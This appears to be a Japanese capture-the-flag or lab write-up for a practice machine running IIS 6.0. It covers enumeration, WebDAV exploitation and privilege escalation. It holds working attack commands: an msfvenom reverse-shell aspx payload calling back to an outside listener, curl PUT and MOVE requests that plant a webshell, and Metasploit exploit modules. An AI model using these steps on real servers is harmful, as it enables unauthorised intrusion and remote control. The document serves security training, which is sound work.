# Enumeration
- port 80 で ```Microsoft IIS httpd 6.0``` が動いている
- ```Microsoft IIS httpd 6.0``` には RCE 可能な脆弱性 CVE-2017-7269 が存在する
  - PoC: https://www.exploit-db.com/exploits/16471

# Exploitation 
## 解1
- ```exploit/windows/iis/iis_webdav_upload_asp``` でmeterpreterシェルを取れる

## 解2
- HTTP メソッドとして PUT と MOVE が許可されているので、webshellをアップロードできる
  - ヘッダを見ると `X-Powered-By: ASP.NET` なので、aspx webshell を実行できる
  ```HTTP/1.1 200 OK
  Content-Length: 1433
  Content-Type: text/html
  Content-Location: http://10.10.10.15/iisstart.htm
  Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
  Accept-Ranges: bytes
  ETag: "05b3daec0d9c21:348"
  Server: Microsoft-IIS/6.0
  MicrosoftOfficeWebServer: 5.0_Pub
  X-Powered-By: ASP.NET
  Date: Thu, 03 Jun 2021 04:29:21 GMT
  ```
  - ペイロードはweb上から探すかmsfvenomで生成する
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=443 -f aspx > met.aspx`
- 拡張子が `aspx` だとアップロードできない
  - 拡張子を txt にしてアップロード
  - `curl -X PUT http://10.10.10.15/webshell.txt -d @webshell.aspx`
- 拡張子を aspx に変更する
  - `curl -X MOVE -H 'Destination:http://10.10.10.15/webshell.aspx' http://10.10.10.15/webshell.txt`
- aspxを実行できるようになる

## 解3
- msfvenom でペイロード生成
  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=443 -f aspx > met.aspx`

# Privesc
- ```post/multi/recon/local_exploit_suggester``` によると、3つ脆弱性がありそう
  - exploit/windows/local/ms14_058_track_popup_menu
  - exploit/windows/local/ms14_070_tcpip_ioctl
  - exploit/windows/local/ms15_051_client_copy_image
- どれか1つを使えばrootが取れるらしい
